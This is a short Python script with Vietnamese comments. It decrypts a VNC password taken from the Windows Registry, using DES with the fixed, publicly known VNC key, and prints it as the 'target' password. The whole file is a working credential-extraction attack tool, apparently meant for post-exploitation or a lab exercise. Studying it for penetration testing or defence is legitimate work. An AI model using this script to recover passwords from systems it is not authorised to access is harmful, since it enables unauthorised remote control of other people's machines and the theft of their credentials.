from Crypto.Cipher import DES
import binascii

# Chuỗi hex lấy từ Registry 
hex_password = "6bcf2a4b6e5aca0f"
vnc_mangled_key = b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'

try:
    encrypted_pass = binascii.unhexlify(hex_password)
    cipher = DES.new(vnc_mangled_key, DES.MODE_ECB)
    decrypted_pass = cipher.decrypt(encrypted_pass).replace(b'\x00', b'')
    print(f"[+] Mật khẩu VNC mục tiêu là: {decrypted_pass.decode('utf-8')}")

except Exception as e:
    print(f"[-] Có lỗi xảy ra trong quá trình giải mã: {e}")